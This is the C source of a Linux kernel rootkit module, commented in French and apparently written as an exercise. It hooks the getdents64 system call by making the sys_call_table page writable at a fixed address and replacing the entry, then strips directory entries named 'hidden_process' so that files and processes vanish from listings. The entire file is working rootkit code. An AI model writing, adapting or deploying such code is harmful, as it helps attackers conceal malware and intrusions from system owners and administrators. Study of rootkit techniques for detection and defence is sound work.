#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/uaccess.h>
#include <linux/slab.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Rootkit Exercise");
MODULE_DESCRIPTION("Rootkit with getdents64 hooking");

// Adresse statique de sys_call_table
unsigned long sys_call_table = 0xffffffffa5200320;

// Pointeurs pour stocker les adresses des fonctions d'origine
asmlinkage int (*original_getdents64)(unsigned int, struct linux_dirent64 __user *, unsigned int);

// Fonctions pour rendre la mémoire en lecture/écriture et lecture seule
void make_rw(unsigned long address) {
    unsigned int level;
    pte_t *pte = lookup_address(address, &level);
    if (pte->pte & ~_PAGE_RW)
        pte->pte |= _PAGE_RW;
}

void make_ro(unsigned long address) {
    unsigned int level;
    pte_t *pte = lookup_address(address, &level);
    pte->pte = pte->pte & ~_PAGE_RW;
}

// Fonction hookée pour getdents64
asmlinkage int hooked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count) {
    int nread;
    struct linux_dirent64 *kdirent, *current_dir, *prev = NULL;
    unsigned long offset = 0;

    nread = original_getdents64(fd, dirp, count);
    if (nread <= 0)
        return nread;

    kdirent = kzalloc(nread, GFP_KERNEL);
    if (!kdirent)
        return nread;

    if (copy_from_user(kdirent, dirp, nread)) {
        kfree(kdirent);
        return nread;
    }

    while (offset < nread) {
        current_dir = (struct linux_dirent64 *)((char *)kdirent + offset);
        if (strstr(current_dir->d_name, "hidden_process")) {
            if (prev)
                prev->d_reclen += current_dir->d_reclen;
            else
                memmove(current_dir, (char *)current_dir + current_dir->d_reclen, nread - offset - current_dir->d_reclen);
            nread -= current_dir->d_reclen;
        } else {
            prev = current_dir;
        }
        offset += current_dir->d_reclen;
    }

    if (copy_to_user(dirp, kdirent, nread)) {
        kfree(kdirent);
        return nread;
    }

    kfree(kdirent);
    return nread;
}

// Initialisation du module
static int __init rootkit_init(void) {
    printk(KERN_INFO "rootkit_init : Début\n");

    // Rendre la mémoire de sys_call_table en lecture/écriture
    make_rw(sys_call_table);

    // Sauvegarder la fonction originale et injecter la fonction hookée
    original_getdents64 = (void *)((unsigned long *)sys_call_table)[__NR_getdents64];
    ((unsigned long *)sys_call_table)[__NR_getdents64] = (unsigned long)hooked_getdents64;

    // Rendre la mémoire de sys_call_table en lecture seule
    make_ro(sys_call_table);

    printk(KERN_INFO "rootkit_init : Terminé\n");
    return 0;
}

// Déchargement du module
static void __exit rootkit_exit(void) {
    printk(KERN_INFO "rootkit_exit : Début\n");

    // Rendre la mémoire de sys_call_table en lecture/écriture
    make_rw(sys_call_table);

    // Restaurer la fonction originale
    ((unsigned long *)sys_call_table)[__NR_getdents64] = (unsigned long)original_getdents64;

    // Rendre la mémoire de sys_call_table en lecture seule
    make_ro(sys_call_table);

    printk(KERN_INFO "rootkit_exit : Module déchargé\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
